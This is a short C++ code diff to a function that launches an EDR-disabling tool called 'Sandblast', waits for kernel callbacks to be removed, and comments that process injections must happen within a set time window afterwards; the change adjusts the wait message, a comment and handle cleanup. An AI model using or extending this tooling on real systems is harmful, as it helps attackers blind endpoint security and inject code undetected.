@@ -20,10 +20,11 @@ bool disable_kernel_callbacks_ok() {
         return false;
     }
     std::cout << "[+] Sandblast: Started '" << wstring2string(cmd) << "'\n";
-    std::cout << "[+] Sandblast: Waiting 12 sec (may need manual adjusting)...\n"; // ensure callbacks are disabled before returning
+    std::cout << "[+] Sandblast: Waiting 15 sec (may need manual adjusting)...\n"; // ensure callbacks are disabled before returning
     std::cout << "// --------------------------- EDR Sandblast start marker --------------------------- //\n"; // mark start in logs
-	Sleep(15000); // on this system it takes ~9 sec until callbacks are disabled, the handle and injection must take place between 9-19 sec
-	CloseHandle(pi.hProcess);
+	Sleep(15000); // on this system it takes ~10 sec until callbacks are disabled, all injections must take place between t+10 and t+30 sec
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
     std::cout << "// --------------------------- EDR Sandblast end marker --------------------------- //\n"; // mark end in logs
     return true;
 }
